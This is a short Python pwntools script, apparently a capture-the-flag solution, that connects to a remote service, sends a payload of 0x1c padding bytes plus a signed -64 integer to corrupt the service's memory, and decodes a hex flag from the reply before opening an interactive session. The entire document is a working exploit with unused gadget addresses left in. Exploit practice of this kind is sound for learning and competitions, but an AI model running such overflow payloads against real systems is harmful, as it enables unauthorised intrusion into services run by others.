from pwn import *

p = remote("amt.rs", 31630)

gad = 0x000000000040116d
main = 0x4011c7
main2 = 0x40118A
addr  = 0x405320
addr2  = 0x405340

#0xffffffc0 = -64 (signed int)

p.recvline()
payload = b"a"*0x1c + p32(0xffffffc0) 
p.sendline(payload)
s = p.recvline().strip()
flag = bytes.fromhex(s.decode())

print(flag.decode("ASCII"))

p.interactive()
